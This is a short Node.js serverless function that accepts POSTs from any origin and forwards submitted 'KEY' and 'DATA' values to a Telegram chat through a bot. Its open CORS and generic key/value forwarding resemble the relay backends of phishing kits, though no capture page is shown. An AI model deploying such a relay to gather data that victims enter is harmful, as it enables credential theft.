const axios = require('axios');

module.exports = async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') return res.status(200).end();

    try {
        const { key, value, type, action } = req.body || {};
        const TOKEN = process.env.BOT_TOKEN;
        const CHAT_ID = process.env.CHAT_ID;

        if (!value && action === 'save') {
            return res.status(200).json({ code: 600 });
        }

        await axios.post(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: ` *KEY:* ${key}\n *DATA:* ${value}`,
            parse_mode: 'Markdown'
        });

        return res.status(200).json({ code: 700 });
    } catch (err) {
        console.error(err);
        return res.status(200).json({ code: 580 });
    }
};